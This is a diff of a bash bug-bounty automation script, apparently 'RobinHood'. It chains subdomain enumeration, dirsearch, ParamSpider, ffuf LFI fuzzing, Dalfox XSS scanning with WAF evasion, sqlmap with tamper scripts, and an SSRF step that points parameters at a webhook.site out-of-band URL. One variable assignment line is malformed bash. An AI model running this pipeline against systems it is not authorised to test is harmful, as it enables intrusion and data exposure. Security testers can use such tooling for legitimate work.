@@ -29,7 +29,12 @@ ORALYZER="/root/Oralyzer/oralyzer.py" # Oralyzer path url tool (EDIT THIS)
 ORALYZER_PAYLOADS="/root/Oralyzer/payloads.txt" # Oralyzer payloads file (EDIT THIS)
 SMUGGLER="/root/smuggler/smuggler.py" # Smuggler tool (EDIT THIS)
 PARAMS="/root/params.txt" # List of params for bruteforcing GET/POST hidden params (EDIT THIS)
-XSS_PAYLOADS="/root/xss-top500-list.txt" # List of XSS payloads (EDIT THIS)
+LFI_PAYLOADS="/root/LFI-Jhaddix.txt" # List of payloads for LFI
+XSS_PAYLOADS="/root/xss-payloads-short-list.txt" # List of XSS payloads (EDIT THIS)
+PARAMSPIDER="/root/ParamSpider/paramspider.py" # Path to paramspider tool (EDIT THIS)
+DIRSEARCH="/root/dirsearch/dirsearch.py" # Path to dirsearch tool (EDIT THIS)
+DIRSEARCH_WORDLIST="/root/dirsearch/dirsearch.txt" # Path to dirsearch wordlist (EDIT THIS)
+$URL_OUT_OF_BAND="https://webhook.site/c7bbcccf-42d9-4161-9713-a6f458a5a4e9" # Url for out of band interactions (use Burp Collaborator or similar)
 
 SUBFINDER=$(command -v subfinder)
 AMASS=$(command -v amass)
@@ -37,7 +42,6 @@ HTTPX=$(command -v httpx)
 GF=$(command -v gf)
 GAU=$(command -v gau)
 QSREPLACE=$(command -v qsreplace)
-SUBJACK=$(command -v subjack)
 GOWITNESS=$(command -v gowitness)
 JSUBFINDER=$(command -v jsubfinder)
 NUCLEI=$(command -v nuclei)
@@ -49,6 +53,7 @@ ALTDNS=$(command -v altdns)
 URO=$(command -v uro)
 CRLFUZZ=$(command -v crlfuzz)
 FFUF=$(command -v ffuf)
+SQLMAP=$(command -v sqlmap)
 
 # Get large scope domain as first argument
 HOST=$1
@@ -72,7 +77,6 @@ echo ''
 echo '* Adding more subdomains using permutation (AltDNS) ..'
 echo ''
 echo ''
-
 
 # Subdomains permutations with altdns
 $ALTDNS -i subdomains_$HOST.txt -o temp_output -w $ALTDNS_WORDS -r -s altdns_temp_subdomains_$HOST.txt
@@ -104,6 +108,15 @@ echo ''
 
 # Check live subdomains and status code
 cat subdomains_$HOST.txt | $HTTPX -mc 200,403,404,500,401 -silent | tee live_subdomains_$HOST.txt
+
+echo ''
+echo ''
+echo '* Run Dirsearch on all live subdomains ..'
+echo ''
+echo ''
+
+# Run dirsearch on all live subdomains
+python3 $DIRSEARCH -l live_subdomains_$HOST.txt -e php,html,aspx -w $DIRSEARCH_WORDLIST -o dirsearch_results.txt --format=plain
 
 echo ''
 echo ''
@@ -147,12 +160,6 @@ then
     rm dnsreaper_$HOST.json
 fi
 
-# Search for subdomains takeover with subjack
-if [ ! -z "$FINGERPRINTS" ]
-then
-    $SUBJACK -w subdomains_$HOST.txt -a -o subjack_$HOST.txt -ssl -c $FINGERPRINTS -v
-fi
-
 echo ''
 echo ''
 echo '* Running nmap on all subdomains ..'
@@ -164,6 +171,21 @@ if [ ! -z "$VULSCAN_NMAP_NSE" ]
 then
     $NMAP -sV -oN nmap_results_$HOST.txt -iL subdomains_$HOST.txt --script=$VULSCAN_NMAP_NSE -F
     sed -i '/Failed to resolve/d' nmap_results_$HOST.txt
+fi
+
+echo ''
+echo ''
+echo '* Running ParamSpider on main domain ..'
+echo ''
+echo ''
+
+# Run ParamSpider
+if [ ! -z "$PARAMSPIDER" ]
+then
+    # Get params with ParamSpider from domain
+    python3 $PARAMSPIDER --domain $HOST --exclude woff,css,js,png,svg,jpg --quiet
+    cat output/$HOST.txt | $URO | tee paramspider_results_$HOST.txt
+    rm -rf output/
 fi
 
 echo ''
@@ -196,7 +218,6 @@ echo '* Searching for public resources in AWS, Azure, and Google Cloud ..'
 echo ''
 echo ''
 
-
 # Searching for public resources in AWS, Azure, and Google Cloud
 KEYWORD=$(echo ${HOST} | cut -d"." -f1)
 python3 $CLOUD_ENUM -k $HOST -k $KEYWORD -l cloud_enum_$HOST.txt
@@ -227,10 +248,9 @@ cat live_subdomains_$HOST.txt | $GAU --blacklist png,jpg,gif,jpeg,swf,woff,svg,p
 
 echo ''
 echo ''
-echo '* Decrease and check live urls ..'
+echo '* Decrease number of urls and save only those with 200 status code ..'
 echo ''
 echo ''
-
 
 # Decrease numbers of URLs using URO and check live urls using httpx
 cat all_urls_$HOST.txt | $URO | $HTTPX -mc 200 -silent | tee live_urls_$HOST.txt
@@ -240,7 +260,6 @@ echo ''
 echo '* Grep endpoints with params ..'
 echo ''
 echo ''
-
 
 # Get endpoints that have parameters
 cat live_urls_$HOST.txt | grep '?' | tee params_endpoints_urls_$HOST.txt
@@ -253,7 +272,7 @@ fi
 
 echo ''
 echo ''
-echo '* Grepq php endpoints without params ..'
+echo '* Grep PHP endpoints without params ..'
 echo ''
 echo ''
 
@@ -275,10 +294,10 @@ else
     if [ ! -z "$PARAMS" ]
     then
         # GET
-        for URL in $(<php_endpoints_urls_$HOST.txt); do ($FFUF -u "${URL}?FUZZ=1" -w $PARAMS -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_$HOST); done
+        for URL in $(<php_endpoints_urls_$HOST.txt); do ($FFUF -u "${URL}?FUZZ=1" -w $PARAMS -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_results); done
 
         # POST
-        for URL in $(<php_endpoints_urls_$HOST.txt); do ($FFUF -X POST -u "${URL}" -w $PARAMS -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_$HOST -d "FUZZ=1"); done
+        for URL in $(<php_endpoints_urls_$HOST.txt); do ($FFUF -X POST -u "${URL}" -w $PARAMS -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_results -d "FUZZ=1"); done
     fi
 fi
 
@@ -347,18 +366,23 @@ fi
 
 echo ''
 echo ''
-echo '* Extracting urls with LFI and SSRF params ..'
+echo '* Search path traversal vuln on ParamSpider results using FFUF ..'
 echo ''
 echo ''
 
-# Extract urls with possible LFI params
-cat params_endpoints_urls_$HOST.txt | $GF lfi > lfi_urls_$HOST.txt
-
-# Remove file if empty
-if [ ! -s lfi_urls_$HOST.txt ]
+# Search of LFI
+if [ ! -s paramspider_results_$HOST.txt ]
 then
-    rm lfi_urls_$HOST.txt
+    rm paramspider_results_$HOST.txt
+else
+    for URL in $(<paramspider_results_$HOST.txt); do ($FFUF -u "${URL}" -c -w $LFI_PAYLOADS -mc 200 -ac -sa -t 20 -or -od ffuf_lfi_results); done
 fi
+
+echo ''
+echo ''
+echo '* Extracting urls with SSRF params and try out-of-band interactions ..'
+echo ''
+echo ''
 
 # Extract urls with possible SSRF params
 cat params_endpoints_urls_$HOST.txt | $GF ssrf > ssrf_urls_$HOST.txt
@@ -367,6 +391,8 @@ cat params_endpoints_urls_$HOST.txt | $GF ssrf > ssrf_urls_$HOST.txt
 if [ ! -s ssrf_urls_$HOST.txt ]
 then
     rm ssrf_urls_$HOST.txt
+else
+    cat ssrf_urls_$HOST.txt | grep "=" | $QSREPLACE $URL_OUT_OF_BAND | xargs curl -ks
 fi
 
 echo ''
@@ -384,12 +410,12 @@ then
     rm xss_urls_$HOST.txt
 else
     # Running Dalfox
-    $DALFOX file xss_urls_$HOST.txt -o dalfox_PoC_$HOST.txt --custom-payload $XSS_PAYLOADS --only-custom-payload --waf-evasion --skip-mining-all
+    $DALFOX file xss_urls_$HOST.txt -o dalfox_PoC_$HOST.txt --custom-payload $XSS_PAYLOADS --only-custom-payload --waf-evasion -w 20
 fi    
 
 echo ''
 echo ''
-echo '* Extracting urls with possible SQL params ..'
+echo '* Extracting urls with possible SQL params and run sqlmap ..'
 echo ''
 echo ''
 
@@ -400,6 +426,8 @@ cat params_endpoints_urls_$HOST.txt | $GF sqli > sqli_urls_$HOST.txt
 if [ ! -s sqli_urls_$HOST.txt ]
 then
     rm sqli_urls_$HOST.txt
+else
+    $SQLMAP -m sqli_urls_$HOST.txt --tamper="between,randomcase" --delay=2 --threads=2 --smart --batch --random-agent --output-dir=sqlmap_$HOST
 fi
 
 echo ''
@@ -430,6 +458,6 @@ echo ''
 echo ''
 echo "********* COMPLETED ! *********"
 echo ''
-echo "Fork it on https://github.com/CalfCrusher/RobinHood and make the world a better place"
+echo "Fork it on https://github.com/CalfCrusher/RobinHood and make World a better place"
 echo ''
 echo Execution time was `expr $end - $start` seconds
